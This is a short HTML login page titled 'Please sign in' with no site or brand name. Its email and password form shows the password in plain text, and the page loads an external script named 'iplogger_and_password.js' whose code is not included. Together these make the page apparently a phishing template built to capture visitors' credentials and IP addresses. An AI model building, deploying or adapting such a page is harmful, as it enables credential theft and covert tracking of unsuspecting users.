<!DOCTYPE html>
<html>


<head>


<title>Please sign in</title>


</head>

<style>
  .button {
      border: none;
      background-color: #009d9d;
      border-radius: 5px;
      color: black;
      padding: 15px 32px;
      text-align: center;
      font-size: 16px;
      margin: 4px 2px;
      cursor: pointer;

  }

  .button:hover {
    background-color: #086e6e;
  }


  .input_boxes {
    border-color: #009d9d;
    border-radius: 5px;
    margin: 4px 2px;
    font-size: 16px;
  }



</style>




<body style="font-family: Verdana, Geneva, Tahoma, sans-serif; text-align: center;">


  <h1>Login required</h1>
  <p1>Please sign in with your user credentials</p1>

  <form id="userInputForm">

    <p></p>

    <label for="useremail">Enter email: </label>

    <p></p>

    <input type="text" id="useremail" name="useremail" class="input_boxes" required>

    <p></p>

    <label for="userpassword">Enter password</label>

    <p></p>

    <input type="text" id="userpassword" name="userpassword" class="input_boxes" required>
    
    <p></p>

    <button class="button" type="submit">Submit</button>
  </form>



  <script src="iplogger_and_password.js"></script>


</body>


</html>
